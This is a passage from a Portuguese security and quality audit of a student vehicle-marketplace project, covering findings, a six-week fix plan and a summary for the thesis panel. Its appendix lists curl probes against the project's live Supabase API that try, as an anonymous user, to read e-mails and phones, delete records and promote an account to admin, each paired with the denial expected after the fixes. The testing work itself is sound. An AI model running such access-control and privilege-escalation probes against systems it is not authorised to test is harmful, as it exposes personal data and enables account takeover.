| F8 | 🟠 | **A view `usuarios_publicos` ignora RLS (§3.6) e o frontend ainda lê `usuarios` diretamente** — `mensagens.html:221,280,413` e `conta.html:457` agora retornam vazio, pois a policy nova só libera o próprio usuário. **Risco de regressão funcional já materializado.** | grep em `mensagens.html`/`conta.html` | migrar essas leituras para `usuarios_publicos` |
| F9 | 🟠 | **Erro de config derruba o site inteiro.** `mgConfig.js:16-21` relança no escopo do módulo → a falha de `fetch("/api/config")` mata o script de **todas** as 20 páginas, sem mensagem ao usuário (skeletons infinitos no marketplace, "Acesso Restrito" eterno no Dev Panel). | `mgConfig.js:11-21`, `marketplace.html:484` | try/catch com estado de erro visível + retry |
| F10 | 🟡 | **Domínios divergentes.** `mgmotors.vercel.app` (canonical de 22 páginas) é um deploy **antigo** — sem `headerGlobal.js` novo, sem as páginas legais no conteúdo, e `/api/config` retorna HTML (a função não está implantada lá). O deploy real é `mgmotorss.vercel.app`; `mgmotors-zeta` redireciona para ele. | teste HTTP nos 3 domínios | padronizar: `mgmotorss.vercel.app` (ou o domínio final escolhido) em canonical, README e `api/carros-ia.js:92` |
| F11 | 🟡 | **E-mail do admin em código público.** `devpanel.html:273` (`ADMIN_EMAILS`), `devpanel.html:325` (**pré-preenchido no input**), `configuracoes.html:245` (3 e-mails). A conta admin é entregada a qualquer visitante que abrir o Dev Panel. | grep confirmado | remover o array e o `value=`; deixar apenas o `is_admin()` do banco |
| F12 | 🟡 | **Duplicação massiva: ~1.050 linhas repetidas em 25 arquivos** (bootstrap do Supabase ×20, footer ×10 com **6 variantes**, breadcrumb ×10, header ×10, Chatling ×21, `escapeHtml` ×2 com contratos diferentes, `executarOuAvisar` com **2 assinaturas incompatíveis**). | análise de duplicação | extrair `core.js` (config, sessão, header, footer, toast, escape) e importar em todas as páginas |
| F13 | 🟡 | **Banner de consentimento sem saída** para usuário sem linha de perfil (OAuth novo): o RPC levanta `'Perfil do usuário não encontrado.'` e o banner **não fecha** — overlay não dispensável em todas as páginas. | `headerGlobal.js:275-282` | fechar o banner e\logar o erro |
| F14 | 🟡 | **A busca principal não tem debounce** — `aplicarFiltroOrdenacao()` re-renderiza as 12 cards + a paginação **a cada tecla**. | `marketplace.html:813` | debounce de 250 ms |
| F15 | 🟡 | **N+1 queries** em 9 laços (`conta.html:303,394,426`, `mensagens.html:279,198`, `inicio.html:401`, `devpanel.html:399,455`) — uma query de `fotos_anuncio`/`usuarios` por item, sequencial. | grep de `await` dentro de `for` | `Promise.all` ou uma query com join/embedding |
| F16 | 🟡 | **Acessibilidade dos modais: zero.** Nenhum modal tem `role="dialog"` (grep: 0 no projeto), `aria-modal`, `aria-labelledby`, focus trap, ESC ou retorno de foco. Fechadores são `<span onclick>` (não focáveis). Cards do marketplace, itens de conversa, tiles de seguidores e **as estrelas de avaliação** são operáveis **só com mouse**. ~25 inputs sem `<label>`/`aria-label`. | grep `role="dialog"` → 0; `tabindex` → 0 | padronizar um helper `abrirModal()`/`fecharModal()` com focus trap + ESC; trocar `<span>` por `<button>`; usar `aria-label` nos campos |
| F17 | 🟡 | **Contraste abaixo de WCAG AA** em 4 pontos: `#999` 12px em `mensagens.css:121` (2,85:1), `rgba(255,255,255,.45)` em `headerGlobal.js:216` (≈4,0:1), `--vermelho #e84040` em `marketplace.css:20,445,800` (≈4,0:1), placeholder em `marketplace.css:206` (≈4,3:1). | leitura de cores | ajustar para ≥4,5:1 |
| F18 | 🟡 | **Os 8 artigos do blog são órfãos** — nenhum link para eles em `dicas.html`; só aparecem no README e nos canonicals. | grep `blogs/` | criar uma seção "Artigos por marca" em `dicas.html` |
| F19 | 🟡 | **"Reativar anúncio" não funciona.** `conta.html:413` faz `update({pausado:false, status:"ativo"})`, mas `trg_proteger_status_anuncios` reverte `status` para `'expirado'` para não-admins → a UI confirma o sucesso e o anúncio continua invisível. | trigger `proteger_status_anuncios` | o trigger deve permitir `status` quando o dono é o autor, ou usar `pausado` como único flag de visibilidade |

---

## 5. Plano de ação — 6 semanas até a banca

### Semana 1 (20–26 out) — 🔴 Segurança no banco *(prioridade máxima)*
1. Migration `2026xxxx_security_hardening.sql` com: trigger BEFORE INSERT em
   `usuarios` (§3.1), policies de storage com path (§3.3), `DROP`
   `criar_tabela_carrinho` (§3.4), `REVOKE` de `promover_moderador` para `anon` (§3.5),
   `security_invoker` na view (§3.6), split das policies `USING (true)` (§3.7, §3.8),
   `search_path` nas 5 funções pendentes, `UNIQUE` em `usuarios.email`.
2. `supabase db push` em **ambiente de teste** primeiro (o CLI já está instalado e
   o projeto está linkado: ref `ilswwmjojfuvcgyymymb`).
3. **Testar com 2 usuários reais** (o próprio `IMPLEMENTACAO-LEGAL.md` §10 exige):
   usuário A tenta ler/deletar dados de B → deve falhar. Guarde o print do teste.
4. Escrever a seção "Testes de segurança" do artigo — é exatamente o tipo de
   evidência que diferencia nota máxima de média.

### Semana 2 (27 out – 2 nov) — 🔴 XSS + Storage + bugs de runtime
5. Aplicar `escapeHtml` em **todas** as interpolações; ou migrar os `<img>`
   para DOM API (§3.2). Atualizar o README para refletir a verdade.
6. Renomear o bucket de fotos privadas (`FOTOS-ANUNCIOS` → bucket privado) ou
   mover `mensagens/<user_id>/...` para bucket privado.
7. Corrigir F5, F6, F7, F9, F13, F14, F19 (bugs que quebram a demo).
8. Remover e-mail hardcoded (F11).

### Semana 3 (3–9 nov) — 🟠 Demo e UX
9. Corrigir header dos blogs (F1) — resolver a base path em `headerGlobal.js`.
10. Corrigir modal no mobile (F2) e linkar `devpanel.css` (F3).
11. Implementar os params `?categoria=` / `?anunciar=1` / `?marca=` (F4).
12. Migrar leituras de `usuarios` → `usuarios_publicos` (F8) e padronizar o domínio (F10).
13. Adicionar os links dos artigos do blog (F18).

### Semana 4 (10–16 nov) — 🟠 RF14/UC21: Notificações *(o FAIL do artigo)*
14. Implementar de verdade: tabela `notificacoes` + RLS + Realtime + badge no header.
    Mínimo viável e defensável:
    - `notificacoes (id, usuario_id, tipo, titulo, mensagem, link, lida, criado_em)`
    - RLS: `SELECT/UPDATE` só do próprio `usuario_id`; `INSERT` via trigger
      (ex.: ao receber mensagem, ao curtir, ao receber denúncia).
    - sino no `headerGlobal.js` + `supabase.channel('notificacoes').subscribe(...)`.
15. **Retestar** RF14/UC21 e atualizar o Quadro 6 do artigo de FAIL → PASS,
    com evidência (print do sino + notificação chegando).
    - Se não couber no tempo: manter o FAIL **e** descrever o plano — mas
      a honestidade do artigo já rende pontos; deixar FAIL sem plano, não.

### Semana 5 (17–23 nov) — 🟠 Evidências e documentação *(o que mais derruba nota hoje)*
16. **Substituir as Figuras 5–8 por capturas reais** da demonstração (o artigo
    admite que são "representações documentais"). Use a home, o login, o
    marketplace com filtros, o Dev Panel e o modal de publicação.
17. **Completar o diário de testes**: executor, data, nº de execuções, dados de
    teste, SO, navegador, resolução, resultado. Preencher a tabela que a
    §5.1 já promete.
18. **Documentar o Chatling**: plano, versão, base de conhecimento, política de
    dados, retenção, e o resultado real de 5–8 perguntas de roteiro (com data).
19. Registrar o período real de desenvolvimento, interrupções e mudanças de escopo (§3.1).
20. Atualizar o README: corrigir a afirmação sobre `escapeHtml`, documentar
    `security_invoker`, a view, as policies novas e o endpoint correto.

### Semana 6 (24–30 nov) — 🟡 Ensaio e defesa
21. Teste completo dos 8 cenários do protocolo de testes, agora com 2 usuários
    (a favor e contra) e com o Dev Panel real.
22. Verificar responsividade em 4 tamanhos (1920, 1366, 768, 375) — o artigo
    cita os breakpoints 1024/768/480; registre dispositivo, resolução e
    navegador.
23. Ensaio da apresentação (15–20 min): problema → protótipo → método →
    resultados → limitações → trabalhos futuros.
24. **Folha de respostas esperados** para as perguntas mais prováveis:
    - *"Por que não usar React/Vue?"* → escopo, prazo, e o ganho de_html/CSS/JS
      sem build step (deploy estático puro, sem pipeline).
    - *"A RLS está realmente funcionando?"* → **mostre o teste de 2 usuários**
      (é a sua evidência mais forte depois das correções da Semana 1).
    - *"O que faltaria para virar produto?"* → pagamentos, verificação de
      identidade, KYC, antifraude, monitoramento, LGPD com DPO.
    - *"Como você avalia a qualidade?"* → ISO/IEC 25010 + os limites que você
      já mapeou no §4.4 (o(auto)elogio honesto vale mais que nota inflada).

---

## 6. O que NÃO fazer (risco de perder nota)

- ❌ **Não apresente o painel admin em público** sem trocar o e-mail exposto e
  sem verificar que a sessão logada é de moderador. O Dev Panel é o que mais
  impressiona — e o que mais expõe se o `is_admin` falhar.
- ❌ **Não deixe o SQLite/Postgres de teste divergindo do de produção.** Rode
  `supabase db push` na ordem das migrations e registre o resultado.
- ❌ **Não troque a estrutura do artigo agora.** Ele está bem construído. Só
  atualize: Figuras 5–8, o Quadro 6 (se RF14 for corrigido), o diário de
  testes, a seção do Chatling e as pendências da §5.1.
- ❌ **Não declare conformidade LGPD.** O texto atual diz "não afirma
  conformidade jurídica integral" — mantenha. É a postura correta e o professor
  vaiiba valorizá-la.

---

## 7. Resumo executivo para a banca

> O MGMOTORS é um protótipo acadêmico **funcional e bem rastreado** (25 casos de
> uso, 16 requisitos funcionais, 37 tabelas, RLS em todas elas, 145 policies,
> deploy contínuo em Vercel, artigo publicado com Quadro de rastreabilidade).
>
> A **contribuição** é demonstrate que uma plataforma de intermediação de
> veículos — do cadastro à moderação, do chat em tempo real ao apoio
> conversacional por IA — pode ser construída com stack web sem framework e
> BaaS gerenciado, **mantendo rastreabilidade entre requisitos, casos de uso,
> modelo de dados e testes**.
>
> Os **limites** são assumidos: notificações estão em implementação, o Chatling
> depende de configuração externa ainda não documentada, e a validação é
> quantitativamente insuficiente (amostra, sem teste de usabilidade formal).
> A análise de segurança, usabilidade e desempenho está mapeada como trabalho
> futuro — e é o próximo passo natural do projeto.

---

## Apêndice A — Comandos úteis

```bash
cd /home/murilo/PROJETOS/MGMOTORS

# aplicar migrations em ambiente de teste
supabase db push --db-url "$TEST_DB_URL"

# verificar policies efetivas no banco
supabase db dump --linked --schema public --file /tmp/schema_efetivo.sql

# localizar todos os innerHTML com dado do banco (revisar escaping)
grep -rn 'innerHTML' --include=*.html --include=*.js . | grep -v node_modules

# conferir se as migrations do repo batem com o banco de produção
diff <(supabase db dump --linked --schema public --data-only=false 2>/dev/null) \
     supabase/migrations/20260915145500_remote_schema.sql
```

## Apêndice B — Comandos de verificação de segurança (após as correções)

```bash
KEY="sb_publishable_0vy8zcMmKEd8oomSUQvJ4Q_SMpqFcxD"
URL="https://ilswwmjojfuvcgyymymb.supabase.co"

# 1) emails/phones não podem ser lidos por anon  → esperado: []
curl -s "$URL/rest/v1/usuarios?select=email,telefone&limit=3" -H "apikey: $KEY" -H "Authorization: Bearer $KEY"

# 2) curtidas não podem ser apagadas por anon     → esperado: 401/403/400
curl -s -X DELETE "$URL/rest/v1/projetos_curtidas?user_id=eq.00000000-0000-0000-0000-000000000000" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY" -w "\nHTTP %{http_code}\n"

# 3) promoting admin como anon                    → esperado: 401/403
curl -s -X POST "$URL/rest/v1/rpc/promover_moderador" -H "apikey: $KEY" -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" -d '{"p_email":"teste@test.invalid"}' -w "\nHTTP %{http_code}\n"

# 4) fotos de anúncio só de anúncios ativos       → comparar com status no anuncios
curl -s "$URL/rest/v1/fotos_anuncio?select=url_foto&limit=5" -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
```
